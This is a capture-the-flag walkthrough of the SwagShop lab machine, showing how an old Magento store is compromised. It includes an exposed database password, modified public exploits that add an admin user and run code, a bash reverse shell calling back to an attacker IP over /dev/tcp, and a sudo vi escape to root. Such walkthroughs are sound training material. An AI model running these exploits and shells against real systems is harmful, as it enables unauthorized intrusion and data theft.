# SwagShop
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | N/A | Nmap, Magescan, LFI | An Nmap scan revealed ports 22 (SSH) and 80 (HTTP) were open. The web server on port 80 was a Magento e-commerce site. A scan with `magescan` revealed the Magento version to be `1.9.0.0, 1.9.0.1` and a misconfiguration that allowed a Local File Inclusion (LFI) vulnerability. This vulnerability was exploited to read `app/etc/local.xml`, which contained MySQL database credentials: `root:fMVWh7bDHpgZkyfqQXreTjU9`. |
| 2 | `b0d` | Magento RCE (CVE-2015-3850) | The identified Magento version was found to be vulnerable to multiple exploits, including an unauthenticated RCE (CVE-2015-3850). A public exploit script was modified to leverage this vulnerability and inject a new administrative user, `b0d`, with a password `forme`. This granted an authenticated foothold. |
| 3 | `www-data` | Authenticated RCE, Reverse Shell | With administrative access, a different public exploit (`php/webapps/37811.py`) for an authenticated RCE was used. This exploit was debugged and adjusted to bypass encoding and type-casting issues. It was then used to inject a reverse shell payload, which successfully connected back to the attacking machine, granting a shell as the `www-data` user. |
| 4 | `root` | `sudo` Misconfiguration (GTFOBins) | Once a shell was established as `www-data`, a `linPEAS` scan revealed a `sudo` misconfiguration. The `www-data` user was allowed to run `/usr/bin/vi` on any file in `/var/www/html/*` as `root` without a password. This was a classic GTFOBins scenario. The `vi` editor was executed with `sudo`, and a new shell was spawned from within `vi` by typing `:!/bin/bash`. |
| 5 | `root` | Final Flag | The final step of the attack chain was to leverage the root shell to navigate the file system and retrieve the final flag. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
Nmap scan report for 10.10.10.140
Host is up (0.27s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp    open     http          Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
311/tcp   filtered asip-webadmin
720/tcp   filtered unknown
1094/tcp  filtered rootd
2144/tcp  filtered lv-ffx
3325/tcp  filtered active-net
3800/tcp  filtered pwgpsi
5054/tcp  filtered rlm-admin
5550/tcp  filtered sdadmind
5633/tcp  filtered beorl
7019/tcp  filtered doceri-ctl
25734/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see we have only port 22 and 80 opened, from the SSH service we can guess that the running os is Ubuntu xenial.  
Now, let's dig into port 80.  
As we hit ```http://swagshop.htb/``` we can notice a magento banner and a copyright version from 2014.  
So we can guess that the running magento version is old.  
First thing first let's enumerate directories using gobuster.  
```
/media                (Status: 301) [Size: 312] [--> http://10.10.10.140/media/]
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.140/includes/]
/lib                  (Status: 301) [Size: 310] [--> http://10.10.10.140/lib/]
/app                  (Status: 301) [Size: 310] [--> http://10.10.10.140/app/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.140/js/]
/shell                (Status: 301) [Size: 312] [--> http://10.10.10.140/shell/]
/skin                 (Status: 301) [Size: 311] [--> http://10.10.10.140/skin/]
/var                  (Status: 301) [Size: 310] [--> http://10.10.10.140/var/]
/errors               (Status: 301) [Size: 313] [--> http://10.10.10.140/errors/]
/mage                 (Status: 200) [Size: 1319]
/server-status        (Status: 403) [Size: 300]
```
Poking around on the site we can notice that a strange redirection is happening, in fact when we browse to different site locations we can see that before the directory name we have ```/index.php/``` prepend.  
Now, let's move forward and run magescan against the target.  
After running magescan, we can notice the version of magento.  
Let's keep this in mind for later.  
```
+-----------+------------------+                                                                                                                                                                                                             
| Parameter | Value            |                                                                                                                                                                                                             
+-----------+------------------+                                                                                                                                                                                                             
| Edition   | Community        |                                                                                                                                                                                                             
| Version   | 1.9.0.0, 1.9.0.1 |                                                                                                                                                                                                             
+-----------+------------------+   
```
In the magescan output, we can notice also that a security check fails.  
in fact we are able to read the following file:  
```
[root@kali SwagShop ]$ php /opt/magescan/magescan.phar scan:all swagshop.htb
[... SNIP ...]
| app/etc/local.xml                            | 200           | Fail   |
[... SNIP ...]
```
As we can see, when we open this file we get possible confidential information, possibly, db credentials and connection information:
```
<connection>
  <host>localhost</host>
  <username>root</username>
  <password>fMVWh7bDHpgZkyfqQXreTjU9</password>
  <dbname>swagshop</dbname>
  <initStatements>SET NAMES utf8</initStatements>
  <model>mysql4</model>
  <type>pdo_mysql</type>
  <pdoType></pdoType>
  <active>1</active>
</connection>
```
Now that we have the version let's look for publicly available exploits:  
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                                               | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                                                                    | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                                                                   | php/webapps/32809.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                                                                         | php/webapps/32808.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                                                                  | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                                             | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                                                                               | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                                                                                                                                  | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                                                                                                  | xml/webapps/37977.py
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                                                | php/webapps/35052.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                                                     | php/webapps/35996.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                                                                               | php/webapps/48135.php
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
After examining all the available exploits compatible with our version, we can try to use ```xml/webapps/37977.py```.  
using this exploit we can create a user and then we can try to use an authenticated exploit and leverage higher privileges.  

## User
Since we found a possible exploit to inject a user into the system, let's try to tune it and run.  
first we need to edit a couple of lines, for example the target (due to previously discovered redirection rule). look at the diffs below:  
```
38c38
< target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"
---
> target_url = target + "/admin/Cms_Wysiwyg/directive/index/"
```
and also let's change the default username:
```
49c49
< query = q.replace("\n", "").format(username="b0d", password="forme")
---
> query = q.replace("\n", "").format(username="forme", password="forme")
```
Now if we try to login into ```http://swagshop.htb/index.php/admin/``` with credentials b0d:forme, we can login as admin.  
now that we have creds, we can try the authenticated RCE exploit and use ```php/webapps/37811.py```.  
To tune this exploit we can use the following parameters:  
```
# Command-line args
target = 'http://swagshop.htb/index.php/admin'
arg = 'bash -c "bash -i >& /dev/tcp/10.10.14.11/9001 0>&1"'

# Config.
username = 'b0d'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml publicly available (magescan)
```
Make this exploit work is a little bit more challenging, as we need to deal with encoding issues and type casting.  
We can help ourselves using [pdb](https://docs.python.org/3/library/pdb.html).  
We just need to ```import pdb``` and set preakpoints with ```pdb.set_trace()```.  
As always intercept exploit requests using burp proxy will help in understand why the exploit gets stuck.  
After we debug the exploit and tune it properly, we can run it, listen on our local port, wait for the shell to gets returned:
```
root@kali:~/Documents/HTB/Boxes/SwagShop# nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.140] 45660
bash: cannot set terminal process group (1391): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$
```

## Root
After we get a shell, if we run ```sudo -l``` we can see that we have a quite obvious privilege escalation path.  
Anyway let's use common practices and spot this running linpeas.sh:  
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d                                                                                                                                                                            
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                  
Matching Defaults entries for www-data on swagshop:                                                                                                                                                                                          
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                                        

User www-data may run the following commands on swagshop:                                                                                                                                                                                    
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*

```
Now, we can just:
```
www-data@swagshop:/var/www/html$ sudo vi /var/www/html/test
```
and type:
```
:!/bin/bash
```
and we got root.
```
www-data@swagshop:/var/www/html$ sudo vi /var/www/html/test
root@swagshop:/var/www/html#
```
